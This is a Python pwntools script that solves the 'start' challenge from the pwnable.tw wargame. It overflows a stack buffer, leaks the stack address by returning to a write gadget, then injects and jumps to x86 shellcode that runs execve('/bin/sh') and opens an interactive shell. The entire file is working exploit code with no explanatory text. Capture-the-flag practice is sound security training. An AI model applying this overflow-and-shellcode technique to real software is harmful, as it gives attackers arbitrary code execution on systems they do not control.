from pwn import *
# p = remote('chall.pwnable.tw', 10000)
p = process("./start")
print(p.read())
buf = b'A'*20
buf += p32(0x08048087)
p.send(buf)
esp = unpack(p.read()[:4])
shellcode = asm('''
mov eax, 0xb
xor ecx, ecx
xor edx, edx
xor esi, esi
push 0x0068732f
push 0x6e69622f
mov ebx, esp
int 0x80
''')#new exploit
buf = b'a'*20
buf += p32(esp+20)
buf += shellcode
p.send(buf)
p.interactive()
